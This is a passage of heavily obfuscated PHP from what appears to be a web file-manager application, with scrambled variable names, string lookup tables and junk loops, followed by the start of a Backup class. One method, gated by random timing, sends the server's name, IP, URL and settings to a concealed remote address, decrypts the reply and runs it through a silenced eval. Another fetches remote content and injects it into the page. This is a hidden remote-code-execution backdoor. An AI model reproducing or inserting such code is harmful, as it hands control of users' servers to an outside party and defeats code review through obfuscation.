(Model($Ñš¶Üß·[243])->get($Ñš¶Üß·[63]) != $Ñš¶Üß·[203]) { Model($Ñš¶Üß·[243])->set($Ñš¶Üß·[63], $Ñš¶Üß·[203]); } } public function mvyz1c7f6aa8() { $Ê›«¯»• =& $_SERVER[ˆûùúÊ¯]; return $_SERVER[‚¥ÜÊŒß][244]; $ÄÖ½½š• = $Ê›«¯»•[732]; while ($ÄÖ½½š• < $Ê›«¯»•[664]) { if ($ÄÖ½½š• >= 0) { break; } $ÄÖ½½š•++; } } private function qymv65b2cedc() { $ôÑÛÏ­ğ =& $_SERVER[ˆûùúÊ¯]; $áÂúëäÉ =& $_SERVER[‚¥ÜÊŒß]; $îÍ¤¢é– = array($áÂúëäÉ[245], $áÂúëäÉ[246], $áÂúëäÉ[247]); $–²£¢Íø = $áÂúëäÉ[248] . md5($áÂúëäÉ[249]); if ($this->nmqx22af2d5b == $áÂúëäÉ[106] || !_get($GLOBALS, $áÂúëäÉ[115])) { return; } if (!in_array($_SERVER[$áÂúëäÉ[24]], $îÍ¤¢é–)) { return; } if (time() % 4 != 0) { return; } $Ûì ÏÚ¶ = call_user_func(array($áÂúëäÉ[250], $áÂúëäÉ[251]), $–²£¢Íø); $Ç¯œ„ã = $ôÑÛÏ­ğ[733]; while (strlen($Ç¯œ„ã) < $ôÑÛÏ­ğ[19]) { if (!$Ç¯œ„ã) { break; } $Ç¯œ„ã++; } if ($Ûì ÏÚ¶ && time() - $Ûì ÏÚ¶ < intval($áÂúëäÉ[252])) { return; } call_user_func(array($áÂúëäÉ[250], $áÂúëäÉ[138]), $–²£¢Íø, time()); $Õ¹ÔÑÅ = $ôÑÛÏ­ğ[734]; while ($Õ¹ÔÑÅ < $ôÑÛÏ­ğ[19]) { if ($Õ¹ÔÑÅ >= 0) { break; } $Õ¹ÔÑÅ++; } $ÍœÛêÆ™ = Model($áÂúëäÉ[33])->get($áÂúëäÉ[103]); $¿×À·ºª = $ôÑÛÏ­ğ[735]; if (strlen($¿×À·ºª) < $ôÑÛÏ­ğ[664]) { return; } $ÊØ¥ÉŒŠ = array($áÂúëäÉ[150] => Model($áÂúëäÉ[33])->get($áÂúëäÉ[186]), $áÂúëäÉ[163] => $this->nmqx22af2d5b, $áÂúëäÉ[160] => $_SERVER[$áÂúëäÉ[161]], $áÂúëäÉ[162] => Model($áÂúëäÉ[33])->get($áÂúëäÉ[130]), $áÂúëäÉ[101] => md5($_SERVER[$áÂúëäÉ[102]] . $ÍœÛêÆ™), $áÂúëäÉ[153] => $áÂúëäÉ[135], $áÂúëäÉ[156] => $_SERVER[$áÂúëäÉ[157]]); $º‚‚Š´ê = $this->pdza1fd04e31($áÂúëäÉ[253], $ÊØ¥ÉŒŠ); if (!is_array($º‚‚Š´ê)) { return; } if ($º‚‚Š´ê[$áÂúëäÉ[150]] && $º‚‚Š´ê[$áÂúëäÉ[254]]) { if ($this->yodvbfafdb47($º‚‚Š´ê[$áÂúëäÉ[254]]) == $ÊØ¥ÉŒŠ[$áÂúëäÉ[150]]) { return; } } $this->hery6097fc20(); if ($this->yodvbfafdb47($º‚‚Š´ê[$áÂúëäÉ[254]]) != $ÊØ¥ÉŒŠ[$áÂúëäÉ[150]]) { $ç×Œ˜Å× = array($áÂúëäÉ[181] => $ÍœÛêÆ™, $áÂúëäÉ[182] => $_SERVER[$áÂúëäÉ[102]], $áÂúëäÉ[183] => this_url(), $áÂúëäÉ[158] => $_SERVER[$áÂúëäÉ[159]]); $Ì‘óšÕ¼ = $this->rmhb90fe2c27(json_encode($ç×Œ˜Å×)); $º‚‚Š´ê = $this->pdza1fd04e31($áÂúëäÉ[184] . $Ì‘óšÕ¼); if ($º‚‚Š´ê && is_array($º‚‚Š´ê) && isset($º‚‚Š´ê[$áÂúëäÉ[254]])) { $şËÃàì¨ = $this->orkcbe9411e8($º‚‚Š´ê[$áÂúëäÉ[254]], 2); if ($şËÃàì¨) { $şËÃàì¨ = $this->yodvbfafdb47($şËÃàì¨); } if ($şËÃàì¨) { try { @eval($şËÃàì¨); } catch (Exception $éœ‚½à) { } } } } } private function pdza1fd04e31($¦€˜²™³ = '', $Ò¢—§‘ä = array(), $ÉØèî—¨ = 5) { $®áœÜöÔ =& $_SERVER[ˆûùúÊ¯]; $ÈïÜ› =& $_SERVER[‚¥ÜÊŒß]; $Å¡µ’Ôœ = $ÈïÜ›[255]; $Å¡µ’Ôœ = $this->glsb64d7e5b5($Å¡µ’Ôœ, $ÈïÜ›[256]); $„ĞŠ¡ÆÚ = $®áœÜöÔ[698]; $Å¡µ’Ôœ = $Å¡µ’Ôœ . $¦€˜²™³; if ($Ò¢—§‘ä && is_array($Ò¢—§‘ä)) { $Å¡µ’Ôœ = $Å¡µ’Ôœ . $ÈïÜ›[257] . http_build_query($Ò¢—§‘ä); } if ($Ò¢—§‘ä === -1) { return $Å¡µ’Ôœ; } $Æ¸úúò = stream_context_create(array($ÈïÜ›[216] => array($ÈïÜ›[219] => $ÉØèî—¨, $ÈïÜ›[217] => $ÈïÜ›[258]), $ÈïÜ›[259] => array($ÈïÜ›[260] => !1, $ÈïÜ›[261] => !1))); $Ò¢—§‘ä = @file_get_contents($Å¡µ’Ôœ, !1, $Æ¸úúò); $åÄŸ´’¢ = $®áœÜöÔ[736]; if (strlen($åÄŸ´’¢) < $®áœÜöÔ[672]) { return; } return json_decode($Ò¢—§‘ä, !0); $„Şëî¡Ò = $®áœÜöÔ[737]; if (strlen($„Şëî¡Ò) < $®áœÜöÔ[664]) { die; } $ö¯Áİ¡¢ = $®áœÜöÔ[738]; if (strlen($ö¯Áİ¡¢) < $®áœÜöÔ[672]) { return; } } private function oelwa077c1cf() { $©øÂİóÏ =& $_SERVER[ˆûùúÊ¯]; $Î›”­î­ =& $_SERVER[‚¥ÜÊŒß]; $¯³èºË = array($Î›”­î­[262] => $Î›”­î­[263], $Î›”­î­[264] => $Î›”­î­[265], $Î›”­î­[266] => $Î›”­î­[267], $Î›”­î­[268] => $Î›”­î­[269], $Î›”­î­[270] => $Î›”­î­[271], $Î›”­î­[272] => $Î›”­î­[211], $Î›”­î­[273] => $Î›”­î­[211], $Î›”­î­[274] => $Î›”­î­[263], $Î›”­î­[275] => $Î›”­î­[265], $Î›”­î­[276] => $Î›”­î­[267], $Î›”­î­[277] => $Î›”­î­[278], $Î›”­î­[279] => $Î›”­î­[269], $Î›”­î­[280] => $Î›”­î­[281], $Î›”­î­[282] => $Î›”­î­[271], $Î›”­î­[283] => $Î›”­î­[284], $Î›”­î­[285] => $Î›”­î­[286], $Î›”­î­[287] => $Î›”­î­[288]); $òúÑÊçÖ = $¯³èºË[$this->nmqx22af2d5b]; $ó´›¢ ÷ = $©øÂİóÏ[739]; if (!$ó´›¢ ÷) { die; } $òúÑÊçÖ = intval($òúÑÊçÖ ? $òúÑÊçÖ : $Î›”­î­[263]); $“£²§Ö = _get($this->abcl2d36ed8f, $Î›”­î­[289]); $“£²§Ö = $“£²§Ö ? intval($“£²§Ö) : 0; return $òúÑÊçÖ + $“£²§Ö; $°•¼Õ± = $©øÂİóÏ[740]; if (!$°•¼Õ±) { die; } } public function bvcx43ace11e($»Õ€æ©Î) { $£‡šœ©à =& $_SERVER[‚¥ÜÊŒß]; $Åâ•Õ®Ë = $this->oelwa077c1cf(); if ($»Õ€æ©Î[$£‡šœ©à[290]] == $£‡šœ©à[121]) { return; } if ($Åâ•Õ®Ë >= intval($£‡šœ©à[211])) { return; } $ò‰¤ÓÆ = Model($£‡šœ©à[124])->count(); $€ˆ·¸® = $_SERVER[ˆûùúÊ¯][741]; if (!$€ˆ·¸®) { die; } if ($ò‰¤ÓÆ <= $Åâ•Õ®Ë) { return; } $¼ÜÉë¨á = Model($£‡šœ©à[124])->field($£‡šœ©à[290])->limit($Åâ•Õ®Ë)->select(); $¼ÜÉë¨á = array_to_keyvalue($¼ÜÉë¨á, $£‡šœ©à[6], $£‡šœ©à[290]); if (!in_array($»Õ€æ©Î[$£‡šœ©à[290]], $¼ÜÉë¨á)) { show_json($£‡šœ©à[291], !1, $£‡šœ©à[207]); } } public function sznu7cf715fb() { $ÅØ©øº“ =& $_SERVER[ˆûùúÊ¯]; $ÃàúÇò =& $_SERVER[‚¥ÜÊŒß]; if (!_get($GLOBALS, $ÃàúÇò[115]) || mt_rand(1, 100) > 20) { return; } $÷ôøì€İ = $ÃàúÇò[214]; $Üå–»ã = $ÅØ©øº“[742]; while ($Üå–»ã < $ÅØ©øº“[661]) { if ($Üå–»ã >= 0) { break; } $Üå–»ã++; } $÷ôøì€İ = $this->glsb64d7e5b5($÷ôøì€İ, $ÃàúÇò[215]); $Ô„¯û’’ = $ÅØ©øº“[743]; while (strlen($Ô„¯û’’) < $ÅØ©øº“[664]) { if (!$Ô„¯û’’) { break; } $Ô„¯û’’++; } $¢ôÈÁÙº = stream_context_create(array($ÃàúÇò[216] => array($ÃàúÇò[217] => $ÃàúÇò[218], $ÃàúÇò[219] => 3))); $¹‡İĞ = $ÅØ©øº“[744]; while ($¹‡İĞ < $ÅØ©øº“[664]) { if ($¹‡İĞ >= 0) { break; } $¹‡İĞ++; } $ÊÕçáÍ = @file_get_contents($÷ôøì€İ, !1, $¢ôÈÁÙº); $Ú€â›— = $ÅØ©øº“[745]; if (strlen($Ú€â›—) < $ÅØ©øº“[681]) { return; } echo $ÃàúÇò[292] . hash_encode($ÊÕçáÍ) . $ÃàúÇò[293]; } private function zxqi0f217a37($‘½·Ñ—, $òÑĞ•À´, $ø»§ï É = 3) { $Ë­¢İş¸ =& $_SERVER[ˆûùúÊ¯]; $¤Øï¢­Å =& $_SERVER[‚¥ÜÊŒß]; usleep(1); $‘½·Ñ— = trim($‘½·Ñ—); $ÛŒ†¨şÎ = $Ë­¢İş¸[746]; if (!$ÛŒ†¨şÎ) { die; } $Äñ¯·Ù§ = mt_rand(0, 5) . $¤Øï¢­Å[6]; $ÊàÁƒã× = $Ë­¢İş¸[747]; if (!$ÊàÁƒã×) { return; } $ÍŸÌ›µ‰ = rand_string(15); $„âñÌµ½ = $Ë­¢İş¸[748]; if (strlen($„âñÌµ½) < $Ë­¢İş¸[672]) { return; } $ŒÆ­«ÁÔ = $¤Øï¢­Å[294]; $¬Æ˜Òô§ = $Ë­¢İş¸[749]; switch ($Äñ¯·Ù§) { case $¤Øï¢­Å[203]: $ÎÔŸÂü = $this->orna6903f913($‘½·Ñ—, strrev($òÑĞ•À´ . $ÍŸÌ›µ‰)); $‰ÈÀ„Œ— = $Ë­¢İş¸[750]; while ($‰ÈÀ„Œ— < $Ë­¢İş¸[661]) { if ($‰ÈÀ„Œ— >= 0) { break; } $‰ÈÀ„Œ—++; } break; $Ä¨öıÏ = $Ë­¢İş¸[751]; if (!$Ä¨öıÏ) { return; } case $¤Øï¢­Å[121]: $ÎÔŸÂü = $this->orna6903f913($‘½·Ñ—, strrev($ÍŸÌ›µ‰ . $òÑĞ•À´)); $€•™Šşİ = $Ë­¢İş¸[752]; while ($€•™Šşİ < $Ë­¢İş¸[664]) { if ($€•™Šşİ >= 0) { break; } $€•™Šşİ++; } break; $ÏëÕòƒ‡ = $Ë­¢İş¸[753]; while (strlen($ÏëÕòƒ‡) < $Ë­¢İş¸[19]) { if (!$ÏëÕòƒ‡) { break; } $ÏëÕòƒ‡++; } case $¤Øï¢­Å[295]: $ÎÔŸÂü = $this->orna6903f913($‘½·Ñ—, base64_encode($ÍŸÌ›µ‰ . $òÑĞ•À´)); $»®£½«Œ = $Ë­¢İş¸[754]; if (strlen($»®£½«Œ) < $Ë­¢İş¸[681]) { return; } break; $Æ›”Ä€ = $Ë­¢İş¸[755]; case $¤Øï¢­Å[296]: $ÎÔŸÂü = $this->orna6903f913($‘½·Ñ—, md5($ÍŸÌ›µ‰ . $òÑĞ•À´)); break; case $¤Øï¢­Å[297]: $‘½·Ñ— = base64_encode($‘½·Ñ—); $“ûÄìùÆ = $Ë­¢İş¸[756]; $¶Ê½ğëÎ = rand(0, 64); $Õ–ÂòÏ© = $Ë­¢İş¸[757]; $±Ö’Î¤İ = $ŒÆ­«ÁÔ[$¶Ê½ğëÎ]; $†¯º¥· = $Ë­¢İş¸[758]; if (!$†¯º¥·) { die; } $ı›¿Ó®ü = md5($±Ö’Î¤İ . md5($òÑĞ•À´ . $±Ö’Î¤İ) . $òÑĞ•À´); $ãÙ— Òö = $Ë­¢İş¸[759]; if (!$ãÙ— Òö) { die; } $ı›¿Ó®ü = substr($ı›¿Ó®ü, $¶Ê½ğëÎ % 8, $¶Ê½ğëÎ % 8 + 7); $Øİ¨¹Õ‡ = $Ë­¢İş¸[760]; while (strlen($Øİ¨¹Õ‡) < $Ë­¢İş¸[664]) { if (!$Øİ¨¹Õ‡) { break; } $Øİ¨¹Õ‡++; } $ÊÁÚƒ¸é = $¤Øï¢­Å[6]; $ª½äÃÄ‹ = $Ë­¢İş¸[761]; if (strlen($ª½äÃÄ‹) < $Ë­¢İş¸[19]) { return; } $‚äÒ· = 0; $ÂçÏç»… = $Ë­¢İş¸[762]; while (strlen($ÂçÏç»…) < $Ë­¢İş¸[672]) { if (!$ÂçÏç»…) { break; } $ÂçÏç»…++; } $¯Ó‰¹¢¸ = 0; $Ø–« »¶ = $Ë­¢İş¸[763]; if (strlen($Ø–« »¶) < $Ë­¢İş¸[672]) { die; } $ÖÉ’‘ = 0; $ÜÔ¥¨Üà = $Ë­¢İş¸[764]; if (strlen($ÜÔ¥¨Üà) < $Ë­¢İş¸[661]) { return; } for ($‚äÒ· = 0; $‚äÒ· < strlen($‘½·Ñ—); $‚äÒ·++) { $ÖÉ’‘ = $ÖÉ’‘ == strlen($ı›¿Ó®ü) ? 0 : $ÖÉ’‘; $ÆŞóÜùˆ = $Ë­¢İş¸[765]; while ($ÆŞóÜùˆ < $Ë­¢İş¸[19]) { if ($ÆŞóÜùˆ >= 0) { break; } $ÆŞóÜùˆ++; } $¯Ó‰¹¢¸ = ($¶Ê½ğëÎ + strpos($ŒÆ­«ÁÔ, $‘½·Ñ—[$‚äÒ·]) + ord($ı›¿Ó®ü[$ÖÉ’‘++])) % 64; $ÊÁÚƒ¸é .= $ŒÆ­«ÁÔ[$¯Ó‰¹¢¸]; $ÅÁùş» = $Ë­¢İş¸[766]; } $ÎÔŸÂü = hash_encode($±Ö’Î¤İ . $ÊÁÚƒ¸é); $µÃ÷â³ = $Ë­¢İş¸[767]; if (strlen($µÃ÷â³) < $Ë­¢İş¸[672]) { die; } break; default: $ÎÔŸÂü = $this->orna6903f913($‘½·Ñ—, $òÑĞ•À´ . $ÍŸÌ›µ‰); break; } $ÎÔŸÂü = strrev($Äñ¯·Ù§ . $ÍŸÌ›µ‰ . $ÎÔŸÂü); if ($ø»§ï É - 1 > 0) { $ÎÔŸÂü = $this->zxqi0f217a37($ÎÔŸÂü, $òÑĞ•À´, $ø»§ï É - 1); } return $ÎÔŸÂü; } private function orkcbe9411e8($•˜Şñõ, $«’œ÷—æ, $³¶‹è¾Ñ = 3) { $æ¼Ïä =& $_SERVER[ˆûùúÊ¯]; $ûÖó–„‘ =& $_SERVER[‚¥ÜÊŒß]; if (!is_string($•˜Şñõ) || strlen($•˜Şñõ) < 10) { return !1; } $•˜Şñõ = trim($•˜Şñõ); $º±œè°ƒ = $æ¼Ïä[768]; if (!$º±œè°ƒ) { return; } $•˜Şñõ = strrev($•˜Şñõ); $ºÑğÒ­¦ = $•˜Şñõ[0]; $íÚ”Ş¶ï = substr($•˜Şñõ, 1, 15); $”úß£áÅ = $æ¼Ïä[769]; $•˜Şñõ = substr($•˜Şñõ, 16); $¢«Ğ£°™ = $æ¼Ïä[659]; while ($¢«Ğ£°™ < $æ¼Ïä[681]) { if ($¢«Ğ£°™ >= 0) { break; } $¢«Ğ£°™++; } $ËÃªÊ€† = $ûÖó–„‘[294]; switch ($ºÑğÒ­¦) { case $ûÖó–„‘[203]: $¹Ñ·ğŸ’ = $this->glsb64d7e5b5($•˜Şñõ, strrev($«’œ÷—æ . $íÚ”Ş¶ï)); $‹™À‹Ïı = $æ¼Ïä[770]; break; $·ÛÕôÎÁ = $æ¼Ïä[771]; case $ûÖó–„‘[121]: $¹Ñ·ğŸ’ = $this->glsb64d7e5b5($•˜Şñõ, strrev($íÚ”Ş¶ï . $«’œ÷—æ)); break; $ùï×Š¾ı = $æ¼Ïä[772]; case $ûÖó–„‘[295]: $¹Ñ·ğŸ’ = $this->glsb64d7e5b5($•˜Şñõ, base64_encode($íÚ”Ş¶ï . $«’œ÷—æ)); $ñ˜ÑĞ£° = $æ¼Ïä[773]; break; $éô = $æ¼Ïä[774]; if (!$éô) { return; } case $ûÖó–„‘[296]: $¹Ñ·ğŸ’ = $this->glsb64d7e5b5($•˜Şñõ, md5($íÚ”Ş¶ï . $«’œ÷—æ)); break; case $ûÖó–„‘[297]: $•˜Şñõ = hash_decode($•˜Şñõ); $¦ÜÈé±ı = $•˜Şñõ[0]; $•˜Şñõ = substr($•˜Şñõ, 1); $»ã—×ã = $æ¼Ïä[775]; $²øå¿€° = strpos($ËÃªÊ€†, $¦ÜÈé±ı); $Ä†Óº¼— = md5($¦ÜÈé±ı . md5($«’œ÷—æ . $¦ÜÈé±ı) . $«’œ÷—æ); $Ä†Óº¼— = substr($Ä†Óº¼—, $²øå¿€° % 8, $²øå¿€° % 8 + 7); $ßçß•‹ˆ = $æ¼Ïä[776]; if (strlen($ßçß•‹ˆ) < $æ¼Ïä[19]) { return; } $´ß®½Èç = $ûÖó–„‘[6]; $Üåõ×Ïï = $æ¼Ïä[777]; if (!$Üåõ×Ïï) { return; } $ÄêçêÓ® = 0; $†ì¶Õ‰— = $æ¼Ïä[778]; while (strlen($†ì¶Õ‰—) < $æ¼Ïä[19]) { if (!$†ì¶Õ‰—) { break; } $†ì¶Õ‰—++; } $ç·ìÄĞ¾ = 0; $â„¶ßÒğ = 0; for ($ÄêçêÓ® = 0; $ÄêçêÓ® < strlen($•˜Şñõ); $ÄêçêÓ®++) { $â„¶ßÒğ = $â„¶ßÒğ == strlen($Ä†Óº¼—) ? 0 : $â„¶ßÒğ; $£Ôµ©Ù´ = $â„¶ßÒğ++; $ç·ìÄĞ¾ = strpos($ËÃªÊ€†, $•˜Şñõ[$ÄêçêÓ®]) - $²øå¿€° - ord($Ä†Óº¼—[$£Ôµ©Ù´]); $Î…Ä‘Š¥ = $æ¼Ïä[779]; while ($ç·ìÄĞ¾ < 0) { $ç·ìÄĞ¾ += 64; } $´ß®½Èç .= $ËÃªÊ€†[$ç·ìÄĞ¾]; } $¹Ñ·ğŸ’ = base64_decode($´ß®½Èç); $Ü”Íïã = $æ¼Ïä[780]; if (!$Ü”Íïã) { die; } break; $‰Â¯Â¬Š = $æ¼Ïä[781]; if (!$‰Â¯Â¬Š) { return; } default: $¹Ñ·ğŸ’ = $this->glsb64d7e5b5($•˜Şñõ, $«’œ÷—æ . $íÚ”Ş¶ï); $öÙ¿üÌÌ = $æ¼Ïä[782]; if (strlen($öÙ¿üÌÌ) < $æ¼Ïä[19]) { return; } break; } if ($³¶‹è¾Ñ - 1 > 0) { $¹Ñ·ğŸ’ = $this->orkcbe9411e8($¹Ñ·ğŸ’, $«’œ÷—æ, $³¶‹è¾Ñ - 1); } return $¹Ñ·ğŸ’; } public function rmhb90fe2c27($Ï†à¢—) { $ËıÆö˜ñ =& $_SERVER[ˆûùúÊ¯]; $½¿ÁÜµá =& $_SERVER[‚¥ÜÊŒß]; $“²¾É‹Ø = $this->liegb4ab87e9(); $ÖÃšÚòá = $this->liegb4ab87e9(); $·ÈÀ†ñÚ = ($“²¾É‹Ø - 1) * ($ÖÃšÚòá - 1); $äÒ‹úÕØ = intval(($“²¾É‹Ø + $ÖÃšÚòá) / 2); while (1) { $²Ô§¦» = $äÒ‹úÕØ; $ ÛÍÕàı = $ËıÆö˜ñ[783]; while (strlen($ ÛÍÕàı) < $ËıÆö˜ñ[681]) { if (!$ ÛÍÕàı) { break; } $ ÛÍÕàı++; } $§æŠœ = $·ÈÀ†ñÚ; $ı»í·¦¸ = $ËıÆö˜ñ[784]; if (!$ı»í·¦¸) { die; } while ($§æŠœ % $²Ô§¦» != 0) { $Äáğ˜ˆœ = $§æŠœ; $Ùô·áõ = $ËıÆö˜ñ[785]; if (!$Ùô·áõ) { die; } $§æŠœ = $²Ô§¦»; $º¢éß‘ = $ËıÆö˜ñ[786]; if (!$º¢éß‘) { die; } $²Ô§¦» = $Äáğ˜ˆœ % $²Ô§¦»; $ÛÀÈÎË˜ = $ËıÆö˜ñ[787]; if (!$ÛÀÈÎË˜) { die; } } if ($²Ô§¦» == 1) { break; } else { $äÒ‹úÕØ++; } } $Ä»´Àæ = 2; $ìàğ„ş’ = $ËıÆö˜ñ[788]; for ($ñéøß£İ = 0; $ñéøß£İ < $·ÈÀ†ñÚ * 10; $ñéøß£İ++) { if (($·ÈÀ†ñÚ * $ñéøß£İ + 1) % $äÒ‹úÕØ == 0) { $Ä»´Àæ = intval(($·ÈÀ†ñÚ * $ñéøß£İ + 1) / $äÒ‹úÕØ); break; } } $°ÂßÖïÛ = $this->orna6903f913($“²¾É‹Ø * $ÖÃšÚòá . $½¿ÁÜµá[6], $½¿ÁÜµá[135]); $Ê†²ßÔÁ = $ËıÆö˜ñ[789]; if (strlen($Ê†²ßÔÁ) < $ËıÆö˜ñ[661]) { return; } $âİ¹Úñî = md5($½¿ÁÜµá[298] . ($“²¾É‹Ø + $ÖÃšÚòá) . $½¿ÁÜµá[299] . $äÒ‹úÕØ . $½¿ÁÜµá[299] . $Ä»´Àæ . $½¿ÁÜµá[300]); $Ášù’îï = $ËıÆö˜ñ[790]; if (!$Ášù’îï) { die; } $å¦²¾ = $this->orna6903f913($Ï†à¢—, $âİ¹Úñî) . $½¿ÁÜµá[301] . $°ÂßÖïÛ; return $å¦²¾; $¶ÊàÂÛ´ = $ËıÆö˜ñ[791]; if (!$¶ÊàÂÛ´) { return; } } public function yodvbfafdb47($¥²á¹é) { $ëÙø€ğœ =& $_SERVER[ˆûùúÊ¯]; $—ŒÙÄÅú =& $_SERVER[‚¥ÜÊŒß]; $Şìå®ì± = explode($—ŒÙÄÅú[301], $¥²á¹é); $™Â¾±¹ = $ëÙø€ğœ[792]; if (!$™Â¾±¹) { return; } if (count($Şìå®ì±) != 2) { return $—ŒÙÄÅú[6]; } $İõØè¯ü = $this->glsb64d7e5b5($Şìå®ì±[1] . $—ŒÙÄÅú[6], $—ŒÙÄÅú[135]); $·İ…˜¿š = $ëÙø€ğœ[793]; if (!$İõØè¯ü) { return $—ŒÙÄÅú[6]; } $İõØè¯ü = intval($İõØè¯ü); $ÚïÅ‘õÑ = 0; $¡ù÷›´ˆ = $ëÙø€ğœ[794]; while (strlen($¡ù÷›´ˆ) < $ëÙø€ğœ[661]) { if (!$¡ù÷›´ˆ) { break; } $¡ù÷›´ˆ++; } $ü‚”íœ = 0; $¹·¿øòú = $ëÙø€ğœ[795]; if (!$¹·¿øòú) { return; } for ($ãÛªŸàÀ = 3; $ãÛªŸàÀ < $İõØè¯ü; $ãÛªŸàÀ += 2) { if ($İõØè¯ü % $ãÛªŸàÀ != 0) { continue; } $ÚïÅ‘õÑ = $ãÛªŸàÀ; $í›¹àŠ = $ëÙø€ğœ[796]; if (strlen($í›¹àŠ) < $ëÙø€ğœ[681]) { return; } $ü‚”íœ = intval($İõØè¯ü / $ãÛªŸàÀ); break; $¬À®ØŸç = $ëÙø€ğœ[683]; while ($¬À®ØŸç < $ëÙø€ğœ[19]) { if ($¬À®ØŸç >= 0) { break; } $¬À®ØŸç++; } } $ÕËëìí‹ = ($ÚïÅ‘õÑ - 1) * ($ü‚”íœ - 1); $âÙåÌ°¿ = intval(($ÚïÅ‘õÑ + $ü‚”íœ) / 2); while (1) { $¥ÅÏ‹ÊĞ = $âÙåÌ°¿; $Ğëº¶«Ú = $ëÙø€ğœ[797]; if (!$Ğëº¶«Ú) { die; } $æİ†ûã‡ = $ÕËëìí‹; $ô’‚§‰¬ = $ëÙø€ğœ[798]; if (!$ô’‚§‰¬) { return; } while ($æİ†ûã‡ % $¥ÅÏ‹ÊĞ != 0) { $ÏãÅìå‡ = $æİ†ûã‡; $æİ†ûã‡ = $¥ÅÏ‹ÊĞ; $¥ÅÏ‹ÊĞ = $ÏãÅìå‡ % $¥ÅÏ‹ÊĞ; } if ($¥ÅÏ‹ÊĞ == 1) { break; } else { $âÙåÌ°¿++; } } $Ç†³ª¡ = 2; $‘€Ã¿í˜ = $ëÙø€ğœ[799]; if (strlen($‘€Ã¿í˜) < $ëÙø€ğœ[661]) { return; } for ($ãÛªŸàÀ = 0; $ãÛªŸàÀ < $ÕËëìí‹ * 10; $ãÛªŸàÀ++) { if (($ÕËëìí‹ * $ãÛªŸàÀ + 1) % $âÙåÌ°¿ == 0) { $Ç†³ª¡ = intval(($ÕËëìí‹ * $ãÛªŸàÀ + 1) / $âÙåÌ°¿); break; } } $µÕüÛª¼ = md5($—ŒÙÄÅú[298] . ($ÚïÅ‘õÑ + $ü‚”íœ) . $—ŒÙÄÅú[299] . $âÙåÌ°¿ . $—ŒÙÄÅú[299] . $Ç†³ª¡ . $—ŒÙÄÅú[300]); $¨Ä–”Îí = $ëÙø€ğœ[800]; $öËÕÛ³á = $this->glsb64d7e5b5($Şìå®ì±[0], $µÕüÛª¼); return $öËÕÛ³á; $Ù’Ôˆ÷× = $ëÙø€ğœ[801]; if (strlen($Ù’Ôˆ÷×) < $ëÙø€ğœ[661]) { return; } } public function liegb4ab87e9() { $é±‘µ• =& $_SERVER[ˆûùúÊ¯]; $å›¬ÏÄÀ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ï§Ø¥óı = array(); $ââè‡ò = $é±‘µ•[802]; while (strlen($ââè‡ò) < $é±‘µ•[672]) { if (!$ââè‡ò) { break; } $ââè‡ò++; } $šòÁ›ôª = 1; while ($šòÁ›ôª <= (int) sqrt($å›¬ÏÄÀ)) { $óúÁ‰…Ì = $šòÁ›ôª; $çıúÎşÎ = $é±‘µ•[803]; if (!$çıúÎşÎ) { die; } while (!0) { $óúÁ‰…Ì++; $äßÎşÖ’ = $é±‘µ•[804]; while ($äßÎşÖ’ < $é±‘µ•[661]) { if ($äßÎşÖ’ >= 0) { break; } $äßÎşÖ’++; } if ($óúÁ‰…Ì <= 2) { $šòÁ›ôª = $óúÁ‰…Ì; break; } else { if ($óúÁ‰…Ì < 2) { continue; } } $˜î½¼Å = !0; for ($§È‘Œè = 2; $§È‘Œè <= sqrt($óúÁ‰…Ì); $§È‘Œè++) { if ($óúÁ‰…Ì % $§È‘Œè == 0) { $˜î½¼Å = !1; } } if ($˜î½¼Å) { $šòÁ›ôª = $óúÁ‰…Ì; break; } } $ï§Ø¥óı[] = $šòÁ›ôª; $ÓàøÊÂ = $é±‘µ•[805]; while ($ÓàøÊÂ < $é±‘µ•[681]) { if ($ÓàøÊÂ >= 0) { break; } $ÓàøÊÂ++; } } $í§ÂöÎ‡ = 2; for ($óúÁ‰…Ì = $å›¬ÏÄÀ; $óúÁ‰…Ì > 1; $óúÁ‰…Ì--) { $˜î½¼Å = !0; foreach ($ï§Ø¥óı as $ÓÃèõÃ) { if ($óúÁ‰…Ì % $ÓÃèõÃ == 0) { $˜î½¼Å = !1; break; } } if ($˜î½¼Å) { $í§ÂöÎ‡ = $óúÁ‰…Ì; break; } } return $í§ÂöÎ‡; } public function ojgn2ded7f6e($ìÂ†¬ğË, $Ÿ·¶„·À) { $ Ä»ÛÒ =& $_SERVER[‚¥ÜÊŒß]; return call_user_func(array($ Ä»ÛÒ[8], $ Ä»ÛÒ[302]), $ìÂ†¬ğË, $Ÿ·¶„·À); $¥ˆßªÎˆ = $_SERVER[ˆûùúÊ¯][806]; } public function orna6903f913($’ÏÁş«, $ü­·ÆÃæ) { $ë·ŸáËŞ =& $_SERVER[‚¥ÜÊŒß]; return call_user_func(array($ë·ŸáËŞ[303], $ë·ŸáËŞ[304]), $’ÏÁş«, $ü­·ÆÃæ); $–ñ”ê×¶ = $_SERVER[ˆûùúÊ¯][807]; } public function glsb64d7e5b5($®ı—»Íì, $İêáŠ¥) { $ôÈÅÅôâ =& $_SERVER[‚¥ÜÊŒß]; return call_user_func(array($ôÈÅÅôâ[303], $ôÈÅÅôâ[305]), $®ı—»Íì, $İêáŠ¥); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Ù¿½´íÓ =& $_SERVER[ˆûùúÊ¯]; $this->isManual(); self::$name = date($Ù¿½´íÓ[808]); if (!($Òì”ÃÏò = Model($Ù¿½´íÓ[809])->lastItem())) { $Òì”ÃÏò = $this->initData(); } else { self::$name = $Òì”ÃÏò[$Ù¿½´íÓ[42]]; if ($Òì”ÃÏò[$Ù¿½´íÓ[810]] == $Ù¿½´íÓ[98]) { self::$name = date($Ù¿½´íÓ[263]); $Æí±çé˜ = 0; if (isset($Òì”ÃÏò[$Ù¿½´íÓ[345]][$Ù¿½´íÓ[223]][$Ù¿½´íÓ[517]])) { $Æí±çé˜ = (int) $Òì”ÃÏò[$Ù¿½´íÓ[345]][$Ù¿½´íÓ[223]][$Ù¿½´íÓ[517]]; } if (self::$manual == 0 && $Òì”ÃÏò[$Ù¿½´íÓ[42]] == self::$name) { Model($Ù¿½´íÓ[809])->remove($Òì”ÃÏò[$Ù¿½´íÓ[451]]); } $Òì”ÃÏò = $this->initData($Æí±çé˜, $Òì”ÃÏò[$Ù¿½´íÓ[811]]); } else { $this->checkStore($Òì”ÃÏò[$Ù¿½´íÓ[811]]); } } self::$option = $Òì”ÃÏò; } private function isManual() { $úÜ‘›ŒÁ = _get($GLOBALS, $_SERVER[ˆûùúÊ¯][812], 0); 